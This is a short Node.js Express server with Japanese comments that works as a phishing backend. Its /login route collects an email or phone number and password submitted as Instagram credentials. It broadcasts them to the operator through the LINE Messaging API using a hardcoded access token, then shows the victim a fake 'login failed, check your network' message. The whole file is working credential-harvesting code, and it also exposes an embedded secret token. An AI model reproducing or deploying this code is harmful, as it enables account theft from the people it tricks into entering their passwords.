const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 10000;

// ★ LINE Developersで取得した情報を設定
const LINE_ACCESS_TOKEN = 'Bo0VLiDNARQHYL+r3ime5Q4wVzK1pB2TKESJR+mjVRmzekBA+HpkMpYH7lvM9GU+lZeHCdE5Yyd07xSJvrKj/Cgp7HF3C1y20/2WQ9adSeyv7jQkYM94E4OW1s1n9WlKpLNYNoQkVCzAc+72mhNc4QdB04t89/1O/w1cDnyilFU='; // チャンネルアクセストークン


app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/login', async (req, res) => {
    const email = req.body.email;
    const password = req.body.password;

    // LINEに送信するメッセージの内容を作成
    const messageText = `【新しい入力通知】\ninstagram:\nメール/電話: ${email}\nパスワード: ${password}`;

    // LINE Messaging APIへ送信
try {
    const response = await fetch('https://api.line.me/v2/bot/message/broadcast', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINE_ACCESS_TOKEN}`
        },
        body: JSON.stringify({
            // to: LINE_USER_ID, ← ブロードキャスト（全体送信）の場合は不要です
            messages: [
                {
                    type: 'text',
                    text: messageText
                }
            ]
        })
    });

    // HTTPステータスエラーのハンドリング
    if (!response.ok) {
        const errorData = await response.json();
        console.error('LINE送信失敗詳細:', errorData);
    } else {
        console.log('LINEメッセージ全体送信成功');
    }
} catch (error) {
    console.error('ネットワーク/通信エラー:', error);
}


    res.send('ログインに失敗しました。ネットワーク接続を確認してください。');
});

app.listen(PORT, () => {
    console.log(`Server started on port ${PORT}`);
});
